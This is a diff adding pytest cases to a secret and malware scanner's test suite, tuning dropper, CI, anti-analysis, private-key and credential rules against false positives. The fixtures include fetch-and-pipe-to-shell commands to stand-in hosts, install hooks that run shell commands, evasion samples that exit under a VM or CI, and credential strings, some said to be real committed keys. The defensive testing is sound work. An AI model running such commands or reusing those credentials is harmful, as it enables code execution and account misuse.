@@ -8,6 +8,8 @@ Python codebase, and a repository somebody had made deep.
 
 from __future__ import annotations
 
+import random
+import string
 from typing import ClassVar
 
 import pytest
@@ -6016,7 +6018,7 @@ class TestProseInsideABlockComment:
         ]
 
 
-class TestATranslationIsNotACredential:
+class TestATranslationIsNotACredentialInAnyScript:
     """Keycloak was the third-worst repository in the corpus at 66 blocking findings, and
     forty-odd of them were `messages_<locale>.properties` -- the Swedish, Portuguese and
     Catalan words for "password", assigned to a key called `password`. `dbeaver` had
@@ -6606,3 +6608,2308 @@ class TestThreeRulesThatAskedTooLittle:
             for f in Scanner().scan(tmp_path).findings
             if f.rule_id == "SUSPECT.CI.PR_TARGET.001" and f.severity >= Severity.HIGH
         ]
+
+
+class TestPipingIntoAProgramIsNotPipingIntoAnInterpreter:
+    """On the third corpus pass `SUSPECT.DROPPER.001` became the largest remaining
+    blocker at 39 repositories, and two classes account for much of it.
+
+    A `|` inside QUOTES is not a pipeline, because the shell never sees it as one.
+    `_is_printed_text` already knew this and required a printer in front of the quotes,
+    which was the conservative first cut: what the string is used for does not change
+    whether the pipe is data. `arg0="curl -fsSL https://code-server.dev/install.sh |
+    sh -s --"`, `check_prereq bun "Install: curl -fsSL https://bun.sh/install | bash"`
+    and an error message about curl being absent are a variable, a function argument and
+    a diagnostic, and none is a pipeline.
+
+    And an interpreter reading its PROGRAM from the pipe is the whole claim.
+    `nmap`'s `checklibs.sh` asks a release page what the latest version of PCRE2 is:
+
+        curl -Ls "$PCRE_SOURCE" | perl -lne 'if(m|tag/pcre2-(\\d+)|){print $1}'
+
+    The program is the quoted one-liner; the fetched bytes are its input. A code flag --
+    `-e`, `-c`, `-n`, `-l`, `-p` -- says so. `sh -s` does not, because it reads stdin and
+    passes the rest as positional arguments, which is exactly how
+    `curl https://sh.rustup.rs | sh -s -- -y` works.
+    """
+
+    def _dropper(self, tmp_path):
+        return [f for f in Scanner().scan(tmp_path).findings if "DROPPER" in f.rule_id]
+
+    def test_install_instructions_in_a_string(self, tmp_path) -> None:
+        (tmp_path / "bootstrap.sh").write_text(
+            "#!/usr/bin/env bash\n"
+            'SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"\n'
+            'arg0="curl -fsSL https://code-server.test/install.sh | sh -s --"\n'
+            'check_prereq bun "Install: curl -fsSL https://bun.test/install | bash"\n'
+            "decoded=$(printf '%s' \"$BLOB\" | base64 -d)\n"
+        )
+        assert all(f.severity <= Severity.MEDIUM for f in self._dropper(tmp_path))
+
+    def test_fetching_a_page_to_read_a_version(self, tmp_path) -> None:
+        (tmp_path / "checklibs.sh").write_text(
+            "#!/bin/sh\n"
+            "eval $(grep '^PCRE2_MAJOR=' $NDIR/libpcre/configure)\n"
+            "PCRE_LATEST=$(curl -Ls -I $PCRE_SOURCE"
+            " | perl -lne 'if(m|tag/pcre2-(\\d+.\\d+)|){print $1;exit(0)}')\n"
+            "PCAP_LATEST=$(curl -Ls $PCAP_SOURCE"
+            " | perl -lne 'if(/libpcap-([\\d.]+).tar.gz/){print $1}')\n"
+        )
+        assert self._dropper(tmp_path) == []
+
+    def test_an_unquoted_pipe_into_a_shell_still_blocks(self, tmp_path) -> None:
+        """The control for the first half."""
+        (tmp_path / "install.sh").write_text(
+            "#!/usr/bin/env bash\n"
+            'SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"\n'
+            "curl -fsSL https://opencode.test/install | bash\n"
+            "decoded=$(printf '%s' \"$BLOB\" | base64 -d)\n"
+        )
+        assert [f for f in self._dropper(tmp_path) if f.severity >= Severity.HIGH]
+
+    def test_sh_dash_s_still_blocks(self, tmp_path) -> None:
+        """The control for the second half, and the reason `-s` is not in the flag list:
+        it reads stdin and passes the rest as positional arguments, which is how rustup's
+        own documented install line works."""
+        (tmp_path / "build-docs.sh").write_text(
+            "#!/usr/bin/env bash\n"
+            "set -euo pipefail\n"
+            "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.test | sh -s -- -y\n"
+            "curl -LsSf https://astral.test/uv/install.sh | sh\n"
+        )
+        assert [f for f in self._dropper(tmp_path) if f.severity >= Severity.HIGH]
+
+
+class TestHelpTextIsNotAPipelineStep:
+    """`SUSPECT.CI.FETCH_EXEC.001`'s message is "a pipeline STEP downloads something and
+    runs it", and the pattern matched any occurrence anywhere in a workflow file. An
+    action that documents its own installer in an input description --
+
+        description: 'How it gets installed. Supported: installer-script
+                      (curl | bash one-liner), or desktop-installer@latest'
+
+    -- is help text for a form field. `in_shell` is the condition the
+    expression-injection rule beside it already uses.
+    """
+
+    def test_an_action_input_description(self, tmp_path) -> None:
+        action = tmp_path / ".github" / "actions" / "setup"
+        action.mkdir(parents=True)
+        (action / "action.yml").write_text(
+            "name: setup\ndescription: Install the toolchain\n"
+            "inputs:\n  method:\n"
+            "    description: 'How it gets installed. Supported: installer-script"
+            " (curl | bash one-liner), or desktop-installer@latest'\n"
+            "    required: false\n"
+            "runs:\n  using: composite\n  steps:\n"
+            "    - run: echo ready\n      shell: bash\n"
+        )
+        assert not [
+            f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SUSPECT.CI.FETCH_EXEC.001"
+        ]
+
+    def test_a_run_step_still_blocks(self, tmp_path) -> None:
+        workflows = tmp_path / ".github" / "workflows"
+        workflows.mkdir(parents=True)
+        (workflows / "ci.yml").write_text(
+            "name: ci\non: [push]\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n"
+            "      - run: curl -LsSf https://astral.test/uv/install.sh | sh\n"
+        )
+        assert [
+            f
+            for f in Scanner().scan(tmp_path).findings
+            if f.rule_id == "SUSPECT.CI.FETCH_EXEC.001" and f.severity >= Severity.HIGH
+        ]
+
+    def test_a_block_scalar_run_step_still_blocks(self, tmp_path) -> None:
+        """The shape the shell-region finder has to get right for this to be safe: a
+        `run: |` block is where most of these actually live."""
+        workflows = tmp_path / ".github" / "workflows"
+        workflows.mkdir(parents=True)
+        (workflows / "ci.yml").write_text(
+            "name: ci\non: [push]\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n"
+            "      - run: |\n"
+            "          echo installing\n"
+            "          curl -fsSL https://opencode.test/install | bash\n"
+        )
+        assert [
+            f
+            for f in Scanner().scan(tmp_path).findings
+            if f.rule_id == "SUSPECT.CI.FETCH_EXEC.001" and f.severity >= Severity.HIGH
+        ]
+
+
+class TestEightShapesFromTheThirdPass:
+    """A third sample, one finding per repository, taken from the pass that measures the
+    whole of this work. Eight more shapes, and fifteen real credentials from the same
+    sample that every one of them has to leave alone.
+    """
+
+    @pytest.mark.parametrize(
+        ("name", "value"),
+        [
+            # A link is a place to go, by the same argument `url` and `endpoint` are.
+            ("customizeTokenLink", b"/docs/react/customize-theme#customize-design-token"),
+            # A route written with a trailing slash. Superset declares its guest-token
+            # endpoint that way.
+            ("GUEST_TOKEN", b"api/v1/security/guest_token/"),
+            # A substitution marker: one run of capitals wrapped in underscores, or the
+            # same idea wearing `@`. An installer replaces both.
+            ("PROGRAMDATA_TOKEN", b"__PROGRAMDATA__"),
+            ("publicKeyToken", b"@_EM_PUBLIC_KEY_TOKEN@"),
+            # The word itself with the separator it is about to be joined to.
+            ("token", b"access_token="),
+            # An Ethereum address, which is the forty hex characters the mining rule
+            # already refuses to match for being a GPG fingerprint's shape.
+            ("quoteToken", b"0x1c7d4b196cb0c7b01d743fbc6116a902379c7238"),
+            # A YAML tag, and a regular expression literal.
+            ("token_allow_list", b"!!python/tuple"),
+            ("NO_NEED_TOKEN_REG", b"/text|hard_line_break|soft_line_break/"),
+        ],
+    )
+    def test_these_are_not_credentials(self, name: str, value: bytes) -> None:
+        from cordon_scanner.detect.secrets import PLACEHOLDER, names_configuration
+
+        assert (
+            NOT_A_SECRET.match(value) is not None
+            or PLACEHOLDER.search(value) is not None
+            or names_configuration(name)
+        )
+
+    @pytest.mark.parametrize(
+        "value",
+        [
+            b"glpat-AAAAAAAAAAAAAAAA",
+            b"dbw2OtmVEeuUvIptb1Coyg",
+            b"hunter2Sup3rSecretV",
+            b"SW2YcwTIb9zpOOhoPsMm",
+            b"xKc9vB2mQ7wRtY4u",
+            b"phc_Kq3Wd7Rt9Zx2Vb5Nm8Jf4Hs6Lp1Gy0Cu3Ae7Tn2Qi9Z",
+            b"npm_aBcDeFgHiJkLmNoPqRsTuVwXyZ012345",
+            b"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMAAAKEY",
+            # Seven more real ones, from this sample. Home Assistant's Aladdin Connect
+            # API Gateway key, a RabbitMQ default password, a Superset SECRET_KEY, a
+            # base64 vault secret, a RevenueCat key, and two AWS-shaped ones.
+            b"k6QaiQmcTm2zfaNns5L1Z8duBtJmhDOW8JawlCC3",
+            b"k0VMxyIJF9S35f3x2uaw5IWAl6Y536O7",
+            b"MOJRH0mkL1IPauahWITSVvyDrQbEEIwljvmxdq03",
+            b"oLXWIiR/AKF+rWaqy9lHkrYgzpATbW3CtJp3UfkVgpE=",
+            b"appl_FIzFhieVpSSmJRYJWwhVrgtnsVf",
+            b"5z4EnxaXjWjWMnuBhc0Ku0u",
+            b"2RRtuMHx95aNI1Kvtn2rChEuwsCogUd4samGPjLh",
+        ],
+    )
+    def test_and_these_still_are(self, value: bytes) -> None:
+        from cordon_scanner.detect.secrets import PLACEHOLDER, is_password_hash, looks_sequential
+
+        assert NOT_A_SECRET.match(value) is None
+        assert PLACEHOLDER.search(value) is None
+        assert not is_password_hash(value)
+        assert not looks_sequential(value)
+
+    def test_a_hex_digest_without_the_prefix_is_unaffected(self) -> None:
+        """The `0x` is optional, not required: `publicKeyToken = cc7b13ffcd2ddd51` in a
+        .NET `App.config` is an assembly identifier and has no prefix."""
+        assert NOT_A_SECRET.match(b"cc7b13ffcd2ddd51") is not None
+        assert NOT_A_SECRET.match(b"0xcc7b13ffcd2ddd51") is not None
+
+
+class TestAskingWhichCloudIsNotAskingWhoIsWatching:
+    """Three anti-analysis patterns whose evidence was weaker than the rule's claim,
+    found by mirroring the files the third pass names and scanning them with the build
+    that is meant to have fixed them.
+
+    A DMI read compared against nothing is the same defect the bare `dmidecode` had
+    earlier in this pass. vLLM reads five `/sys/class/dmi/id/` files to work out which
+    cloud it is on -- mapping the strings to "AWS", "GCP" and "Azure" for usage
+    telemetry -- and `unsloth` copies the same list for a vLLM compatibility check.
+    Identifying a cloud vendor is not asking whether you are being watched. A probe
+    compares the answer to a hypervisor name, which is what the `VirtualBox|VMware|QEMU`
+    alternative beside it already requires.
+
+    A bare `debugger;` is a breakpoint somebody left in, or -- in Emscripten's generated
+    glue, which excalidraw ships as `woff2-bindings.ts` -- the implementation of a wasm
+    import literally called `debugger`. It helps analysis rather than resisting it; the
+    anti-debug trick is the stopwatch around it.
+
+    And a bail-out that returns a BOOLEAN is a predicate answering a question.
+    `claude-mem`'s `isBannerEnabled()` returns false in CI because a banner in a log is
+    noise. The guard form -- a bare `return`, `sys.exit`, `process.exit` -- is what
+    skipping work looks like.
+    """
+
+    def _anti(self, tmp_path):
+        return [f for f in Scanner().scan(tmp_path).findings if "ANTI_ANALYSIS" in f.rule_id]
+
+    def test_reading_dmi_to_name_a_cloud(self, tmp_path) -> None:
+        (tmp_path / "usage_lib.py").write_text(
+            "import requests\n\n"
+            "def _cloud_provider():\n"
+            "    vendor_files = [\n"
+            '        "/sys/class/dmi/id/product_version",\n'
+            '        "/sys/class/dmi/id/bios_vendor",\n'
+            '        "/sys/class/dmi/id/product_name",\n'
+            "    ]\n"
+            '    cloud_identifiers = {"amazon": "AWS", "google": "GCP"}\n'
+            "    for path in vendor_files:\n"
+            "        with open(path) as handle:\n"
+            "            for needle, name in cloud_identifiers.items():\n"
+            "                if needle in handle.read().lower():\n"
+            "                    return name\n"
+            '    return "UNKNOWN"\n\n'
+            "def report(data):\n"
+            '    requests.post("https://stats.example.test/u", json=data)\n'
+        )
+        assert self._anti(tmp_path) == []
+
+    def test_comparing_dmi_to_a_hypervisor_still_fires(self, tmp_path) -> None:
+        """The control, and the shape the rule is named for."""
+        (tmp_path / "stage.py").write_text(
+            "import base64\nimport subprocess\n\n"
+            'with open("/sys/class/dmi/id/product_name") as handle:\n'
+            '    if "VirtualBox" in handle.read() or "QEMU" in handle.read():\n'
+            "        raise SystemExit(0)\n\n"
+            'subprocess.run(base64.b64decode(b"ZWNobyBoaQ==").decode(), shell=True)\n'
+        )
+        assert self._anti(tmp_path)
+
+    def test_a_wasm_import_called_debugger(self, tmp_path) -> None:
+        (tmp_path / "woff2-bindings.ts").write_text(
+            "const imports = {\n"
+            '  "f64-rem"(x: number, y: number) {\n'
+            "    return x % y;\n"
+            "  },\n"
+            "  debugger() {\n"
+            "    debugger;\n"
+            "  },\n"
+            "};\n"
+            "export async function load(url: string) {\n"
+            "  const response = await fetch(url);\n"
+            "  return WebAssembly.instantiate(await response.arrayBuffer(), imports);\n"
+            "}\n"
+        )
+        assert self._anti(tmp_path) == []
+
+    def test_a_predicate_that_returns_false_in_ci(self, tmp_path) -> None:
+        (tmp_path / "banner.ts").write_text(
+            "export function isBannerEnabled(): boolean {\n"
+            "  if (!process.stdout.isTTY) return false;\n"
+            "  if (process.env.CI) return false;\n"
+            "  return true;\n"
+            "}\n"
+            "export async function check(url: string) {\n"
+            "  const body = await fetch(url);\n"
+            "  return Buffer.from(await body.text(), 'base64');\n"
+            "}\n"
+        )
+        assert self._anti(tmp_path) == []
+
+    def test_a_guard_that_returns_nothing_still_fires(self, tmp_path) -> None:
+        """The control for the third. A bare `return` skips the work; `return false`
+        answers a question."""
+        (tmp_path / "setup.py").write_text(
+            "import base64\nimport os\nimport subprocess\nimport sys\n\n"
+            'if os.environ.get("CI"):\n'
+            "    sys.exit(0)\n\n"
+            'subprocess.run(base64.b64decode(b"ZWNobyBoaQ==").decode(), shell=True)\n'
+        )
+        assert self._anti(tmp_path)
+
+
+class TestAPemBlockTooSmallToBeAKey:
+    """Twelve blocking private-key findings across the mirrored third-pass files became
+    three, and the three that remain are real committed keys. The nine were one class
+    with two halves, and both needed the FILE rather than the match: the private-key
+    pattern captures the armour plus twelve base64 characters, which is too little to
+    judge either question -- the same reason the published-key check already reads a
+    window.
+
+    A body too SHORT to encode a key of any algorithm is an illustration of the format.
+    Ed25519 in PKCS#8 is about sixty-four base64 characters, EC P-256 in SEC1 about a
+    hundred and twenty, RSA runs into the hundreds. `fastlane` documents its App Store
+    Connect action with twelve characters of keyboard mash between the armour lines, and
+    `juspay/hyperswitch` writes the same shape into an OpenAPI `example =` annotation.
+
+    A body carrying a PLACEHOLDER marker is the other half. `n8n`'s Google credential
+    shows the field as an elided key, and the elision in the middle is the whole point.
+    """
+
+    def _keys(self, tmp_path):
+        return [
+            f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SECRET.PRIVATE_KEY.001"
+        ]
+
+    def test_twelve_characters_of_mash(self, tmp_path) -> None:
+        (tmp_path / "action.rb").write_text(
+            "      key_content: "
+            '"-----BEGIN EC PRIVATE KEY-----\\nfewfawefawfe\\n-----END EC PRIVATE KEY-----"\n'
+        )
+        assert self._keys(tmp_path) == []
+
+    def test_an_openapi_example_annotation(self, tmp_path) -> None:
+        (tmp_path / "admin.rs").write_text(
+            '    #[schema(value_type = String, example = "-----BEGIN RSA PRIVATE KEY-----'
+            '\\n897238huhbsdbjh12==\\n-----END RSA PRIVATE KEY-----")]\n'
+        )
+        assert self._keys(tmp_path) == []
+
+    def test_an_elided_key(self, tmp_path) -> None:
+        (tmp_path / "GoogleApi.credentials.ts").write_text(
+            "\t\t\t\tdefault:\n"
+            "\t\t\t\t\t'-----BEGIN PRIVATE KEY-----\\nXIYEvQIBADANBg<...>0IhA7TMoGYPQc="
+            "\\n-----END PRIVATE KEY-----\\n',\n"
+        )
+        assert self._keys(tmp_path) == []
+
+    def test_a_key_long_enough_to_be_one_still_blocks(self, tmp_path) -> None:
+        """The control, and the reason the threshold is sixty rather than anything
+        larger: the shortest real private key there is sits just above it."""
+        body = "\n".join(["MC4CAQAwBQYDK2VwBCIEIH3kQ9mZ2xT7vL4nR8wYaB3kQ9mZ2xT7vL4nR8wYq1Ls"] * 3)
+        (tmp_path / "deploy_key").write_text(
+            f"-----BEGIN PRIVATE KEY-----\n{body}\n-----END PRIVATE KEY-----\n"
+        )
+        assert [f for f in self._keys(tmp_path) if f.severity >= Severity.HIGH]
+
+    def test_a_dunder_directory_is_a_convention(self, tmp_path) -> None:
+        """Storybook keeps a text file named `Primary.png` under
+        `__mockdata__/src/__screenshots__/`, which no `__mocks__` or `__snapshots__` glob
+        can see. Every project invents its own dunder directory and none of them is
+        product source."""
+        from cordon_scanner.detect.secrets import is_test_material
+
+        assert is_test_material("code/core/__mockdata__/src/__screenshots__/Primary.png")
+        assert is_test_material("pkg/__fixtures__/key.pem")
+        assert not is_test_material("src/__init__.py")
+        assert not is_test_material("src/main.py")
+
+
+class TestAOneLinerThatOnlyTalks:
+    """`node -e` and `python -c` are in `HOSTILE_IN_LIFECYCLE` because they take a string
+    and run it, which is the shape every second-stage loader uses. They are also how a
+    package prints a message or declines to install.
+
+    `electron` sets `"preinstall": "node -e 'process.exit(0)'"` so that `npm install`
+    fails and people use yarn. `OpenHands` uses the same construct to print a welcome
+    message naming the command to run next. Both were reported at HIGH through the
+    "performs unexpected operations" branch, which sets that severity unconditionally --
+    so being the project's own manifest did not help.
+
+    The engine already draws this distinction for hook PATHS: `PRINTING_COMMANDS` and
+    `Engine._runs` strip printer segments before resolving what a lifecycle script
+    reaches. The manifest detector had no equivalent for the program inside a `-e`.
+
+    Still reported, through the branch that says a script runs at install time and is not
+    a recognised build step. What changes is that a message does not read as an
+    operation.
+    """
+
+    @staticmethod
+    def _manifest(tmp_path, scripts: dict) -> list:
+        import json
+        import subprocess
+
+        (tmp_path / "package.json").write_text(
+            json.dumps({"name": "p", "version": "1.0.0", "scripts": scripts})
+        )
+        # A git root, because `_is_first_party` asks whether the scan target IS one --
+        # without it every manifest reads as a downloaded package and the severity under
+        # test is the wrong one.
+        subprocess.run(["git", "init", "-q", str(tmp_path)], check=True)
+        return [
+            f
+            for f in Scanner().scan(tmp_path).findings
+            if f.rule_id.startswith(("SUSPECT.INSTALL", "MALWARE.INSTALL"))
+        ]
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "node -e 'process.exit(0)'",
+            "node -e \"console.log('installed')\"",
+            "python -c 'print(\"done\")'",
+        ],
+    )
+    def test_a_message_or_an_exit_does_not_block(self, tmp_path, command: str) -> None:
+        hits = self._manifest(tmp_path, {"preinstall": command})
+        assert hits, "still reported: it does run at install time"
+        assert all(f.severity <= Severity.MEDIUM for f in hits)
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "node -e \"require('child_process').execSync('prek install')\"",
+            "node -e \"require('https').get(process.env.U)\"",
+            "python -c \"import os; os.system('id')\"",
+        ],
+    )
+    def test_a_one_liner_that_does_work_still_blocks(self, tmp_path, command: str) -> None:
+        """The control. `cherry-studio`'s `prepare` installs a git hook with
+        `require('child_process').execSync`, which is exactly what must not be excused --
+        and any substring from `NOT_INERT` disqualifies the whole command, so a program
+        that prints AND does something else is not covered either."""
+        hits = self._manifest(tmp_path, {"postinstall": command})
+        assert [f for f in hits if f.severity >= Severity.HIGH]
+
+    def test_a_fetch_and_run_is_still_critical(self, tmp_path) -> None:
+        hits = self._manifest(
+            tmp_path,
+            {
+                "postinstall": "node -e \"require('child_process').execSync('curl -s https://x.test|sh')\""
+            },
+        )
+        assert [f for f in hits if f.rule_id == "MALWARE.INSTALL.FETCH_EXEC.001"]
+
+
+class TestHowOftenAWideningDismissesARealSecret:
+    """The durable guard for this whole pass. Sixty-odd widenings went into
+    `NOT_A_SECRET` and `PLACEHOLDER`, each with a handful of named values asserted to
+    survive it -- and a handful of examples cannot measure a cumulative rate. This does.
+
+    Generated key material is base64, base62 or hex, so a random value over that alphabet
+    stands in for every credential the generic rule exists to catch. The question is what
+    fraction of them any combination of branches dismisses.
+
+    Measured when this was written:
+
+    * **With an internal digit** -- which every generated credential has -- 7 of 20,000,
+      about one in three thousand. Four were `PLACEHOLDER` matching `your`, `fake` or
+      `xxxx` as a case-insensitive substring, which is the known cost of a substring
+      vocabulary; one was the predicate branch (`is`/`has`/`use` and a capital).
+    * **With no digit at all**, 84 of 20,000. That is the documented trade of the
+      mixed-case branch, written down in `NOT_A_SECRET`'s own docstring long before this
+      pass: a value of eight or more letters with no digit and no symbol is a name
+      somebody wrote, and an all-letter passphrase is missed by this rule.
+
+    The budgets below are deliberately close to those numbers. A widening that doubles
+    either of them has to change this test, which is the point: the next person gets to
+    see the cost before they pay it.
+    """
+
+    ALPHABET = string.ascii_letters + string.digits
+    SAMPLE = 20000
+    WITH_DIGIT_BUDGET = 20
+    ALL_LETTER_BUDGET = 140
+
+    @staticmethod
+    def _dismissed(value: bytes) -> bool:
+        """Every value test the generic rule applies, asked together.
+
+        `reads_as_words` and `decodes_to_prose` joined this after they were written:
+        a widening that is measured on its own and then never measured again is how a
+        budget drifts. Neither moved either number -- a random base62 run has letter
+        runs of one and two characters all through it, which is exactly what the word
+        test refuses."""
+        from cordon_scanner.detect.secrets import PLACEHOLDER, decodes_to_prose, reads_as_words
+
+        return (
+            NOT_A_SECRET.match(value) is not None
+            or PLACEHOLDER.search(value) is not None
+            or reads_as_words(value)
+            or decodes_to_prose(value)
+        )
+
+    def test_a_credential_with_a_digit_is_almost_never_dismissed(self) -> None:
+        rng = random.Random(11)  # noqa: S311 -- sampling an alphabet, not making a key
+        dismissed = 0
+        for _ in range(self.SAMPLE):
+            value = [rng.choice(self.ALPHABET) for _ in range(32)]
+            # A digit somewhere in the middle, which every generated credential has and
+            # which is the premise the mixed-case branch rests on.
+            value[rng.randrange(2, 28)] = rng.choice(string.digits)
+            if self._dismissed("".join(value).encode()):
+                dismissed += 1
+        assert dismissed <= self.WITH_DIGIT_BUDGET, (
+            f"{dismissed} of {self.SAMPLE} random base62 values with an internal digit "
+            f"are dismissed, over the budget of {self.WITH_DIGIT_BUDGET}"
+        )
+
+    def test_the_unconstrained_rate_is_the_documented_one(self) -> None:
+        """The same population with no digit guaranteed, which is the honest total. The
+        extra dismissals are the values that happened to draw no digit at all -- about
+        four in a thousand of base62 at this length -- and every one of them is the
+        documented trade of the mixed-case branch, written into `NOT_A_SECRET`'s own
+        docstring long before this pass.
+
+        Measured over base62 rather than over pure letters. A pure-letter generator would
+        report twenty thousand of twenty thousand and mean nothing: the branch says an
+        all-letter value IS a name, so the only useful question is how often a credential
+        drawn from the real alphabet looks like one."""
+        rng = random.Random(7)  # noqa: S311 -- sampling an alphabet, not making a key
+        dismissed = sum(
+            1
+            for _ in range(self.SAMPLE)
+            if self._dismissed("".join(rng.choice(self.ALPHABET) for _ in range(32)).encode())
+        )
+        assert dismissed <= self.ALL_LETTER_BUDGET, (
+            f"{dismissed} of {self.SAMPLE} random base62 values are dismissed, over the "
+            f"budget of {self.ALL_LETTER_BUDGET}"
+        )
+
+    def test_every_guard_value_this_pass_collected(self) -> None:
+        """And the named values, in one place. Each was committed to a public repository
+        by somebody who meant to, and each survived every widening made after it was
+        found."""
+        for value in (
+            b"glpat-AAAAAAAAAAAAAAAA",
+            b"dbw2OtmVEeuUvIptb1Coyg",
+            b"hunter2Sup3rSecretV",
+            b"SW2YcwTIb9zpOOhoPsMm",
+            b"xKc9vB2mQ7wRtY4u",
+            b"phc_Kq3Wd7Rt9Zx2Vb5Nm8Jf4Hs6Lp1Gy0Cu3Ae7Tn2Qi9Z",
+            b"npm_aBcDeFgHiJkLmNoPqRsTuVwXyZ012345",
+            b"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMAAAKEY",
+            b"k6QaiQmcTm2zfaNns5L1Z8duBtJmhDOW8JawlCC3",
+            b"k0VMxyIJF9S35f3x2uaw5IWAl6Y536O7",
+            b"MOJRH0mkL1IPauahWITSVvyDrQbEEIwljvmxdq03",
+            b"oLXWIiR/AKF+rWaqy9lHkrYgzpATbW3CtJp3UfkVgpE=",
+            b"appl_FIzFhieVpSSmJRYJWwhVrgtnsVf",
+            b"5z4EnxaXjWjWMnuBhc0Ku0u",
+            b"2RRtuMHx95aNI1Kvtn2rChEuwsCogUd4samGPjLh",
+            b"hc2wb63opyfxnwn",
+            b"yku5ej8nvfaor28lvtrabcx0wkrpkztz",
+            b"sec-01e0d4agf6pfvwdjwxp61n3fvg",
+            b"4byOdcHPvnUGJ5DL2cwLZccI5HUKKxkVJ",
+            b"lsACyCD94FhDUtGTXi3QzcFE2uU1hqtDaKeqrdwj",
+            b"wLc4dpQvRt8mK1nS9jH2fXaU7yEoB3iZ6vNqTgCkW5A",
+            b"GC7UDZ3Ra4jLcmfQSagKCDJ1JEy-mU6pBBhFrS3tDEHILrK7j3TQHUrglkO5SgZ_",
+            b"bR4SJwOkvnG5WvVJ",
+            b"lNKDTZdJrE76Sg8WEyeN9mXT29l1xq7Q",
+            b"yFXfmXX3Zn5tnpNJ7HAcbLvqcMVioqPDGV1GXn2FeV0=",
+        ):
+            assert not self._dismissed(value), value
+
+
+class TestAKeyNamedPlaceholderSaysWhatItsValueIs:
+    """The provider patterns consult almost nothing, and that is usually right: a `sk_live_`
+    prefix is a Stripe key wherever it sits. The exception is the key it is assigned to.
+
+    `Mintplex-Labs/anything-llm` writes `placeholder="sk-myApiKeyToAccessMyChromaInstance"`
+    in a settings form and `makeplane/plane` writes `placeholder: "sk-asddassdf..."`. A
+    form's placeholder is the grey text in the empty box -- it is there to be replaced.
+    """
+
+    @staticmethod
+    def _rules(tmp_path, text: str) -> set[str]:
+        (tmp_path / "Settings.tsx").write_text(text)
+        return {f.rule_id for f in Scanner().scan(tmp_path).findings}
+
+    @pytest.mark.parametrize(
+        "key",
+        ["placeholder", "example", "hint", "sample", "demo", "dummy", "template", "defaultValue"],
+    )
+    def test_the_key_names_the_value_an_illustration(self, tmp_path, key: str) -> None:
+        token = assemble("sk-", "myApiKeyToAccessMyChromaInstanceXQ2m")
+        assert "SECRET.OPENAI.KEY.001" not in self._rules(tmp_path, f'<input {key}="{token}" />\n')
+
+    def test_the_same_token_under_an_ordinary_key_is_reported(self, tmp_path) -> None:
+        """The control. Nothing about the value changed; only the author's statement did."""
+        token = assemble("sk-", "myApiKeyToAccessMyChromaInstanceXQ2m")
+        assert "SECRET.OPENAI.KEY.001" in self._rules(tmp_path, f'<input value="{token}" />\n')
+
+    def test_the_window_is_the_key_and_not_the_paragraph(self) -> None:
+        """Scoped to the 120 bytes before the match, so a `placeholder` attribute on one
+        element does not excuse a token on the next."""
+        from cordon_scanner.detect.secrets import is_illustrated_by_its_key
+
+        raw = b'placeholder="x"\n' + b"<!-- " + b"y" * 200 + b" -->\nconst k = '"
+        assert not is_illustrated_by_its_key(raw, len(raw))
+
+
+class TestTheAlphabetInsideAProviderPrefix:
+    """`looks_sequential` has always been applied to the generic assignment rule and never
+    to the provider patterns, which is backwards: documentation is exactly where a real
+    provider prefix appears with an obviously invented body.
+
+    `TryGhost/Ghost` documents Stripe as `sk_live_abcdefghij...` and `headroomlabs` writes
+    `Bearer sk-ant-api03-abcdefghij...` in a README.
+    """
+
+    @staticmethod
+    def _rules(tmp_path, text: str) -> set[str]:
+        (tmp_path / "README.md").write_text(text)
+        return {f.rule_id for f in Scanner().scan(tmp_path).findings}
+
+    def test_a_documented_stripe_key_is_the_alphabet(self, tmp_path) -> None:
+        key = assemble("sk_live_", "abcdefghijklmnopqrstuvwxyz0123456789")
+        assert "SECRET.STRIPE.KEY.001" not in self._rules(tmp_path, f"Set `{key}` in your env.\n")
+
+    def test_a_real_stripe_key_has_no_run_in_it(self, tmp_path) -> None:
+        """The control, and the reason the threshold is a run of six and not of three."""
+        key = assemble("sk_live_", "51Kq2mVt7Xb1NpLr4Ws9Dy3Fz6Hj0Cg5Aq2EgHj0")
+        assert "SECRET.STRIPE.KEY.001" in self._rules(tmp_path, f"export STRIPE={key}\n")
+
+
+class TestThePublicHalfOfASignature:
+    """A SigV4 presigned URL carries the access key id in its query string by construction.
+    The signature is what authorises, the signature is in the URL too, and it expires.
+
+    `Asabeneh/30-Days-Of-Python` ships a 14,000-row Hacker News export, and one row holds a
+    GitHub-generated presigned S3 link.
+    """
+
+    @staticmethod
+    def _rules(tmp_path, text: str) -> set[str]:
+        (tmp_path / "data.csv").write_text(text)
+        return {f.rule_id for f in Scanner().scan(tmp_path).findings}
+
+    def test_a_key_id_in_a_presigned_url_is_not_a_leak(self, tmp_path) -> None:
+        key = assemble("AKIA", "ISTNZFOVBIJMK3TQ")
+        url = f"https://s3.amazonaws.com/x?X-Amz-Credential={key}%2F20190101%2Fus-east-1"
+        assert "SECRET.AWS.ACCESS_KEY.001" not in self._rules(tmp_path, f"1,title,{url}\n")
+
+    def test_the_same_id_in_a_config_line_is_reported(self, tmp_path) -> None:
+        """The control. `X-Amz-Credential=` is the whole of the claim."""
+        key = assemble("AKIA", "ISTNZFOVBIJMK3TQ")
+        assert "SECRET.AWS.ACCESS_KEY.001" in self._rules(tmp_path, f"aws_access_key_id,{key}\n")
+
+
+class TestTestHelpersLiveBesideTheLibrary:
+    """`huggingface/transformers` keeps a Hub token in `src/transformers/testing_utils.py`.
+    No `test_*` or `*_test.*` glob matches that name and it is in no test directory either
+    -- the helpers ship with the package, because the package's users write tests too.
+    """
+
+    @pytest.mark.parametrize(
+        "name", ["testing_utils.py", "conftest.py", "test-helpers.ts", "utils.tests.js"]
+    )
+    def test_the_filename_is_the_statement(self, name: str) -> None:
+        from cordon_scanner.detect.secrets import names_test_file
+
+        assert names_test_file(f"src/transformers/{name}")
+
+    @pytest.mark.parametrize("name", ["latest.py", "manifest.py", "protest.py", "contest_rules.py"])
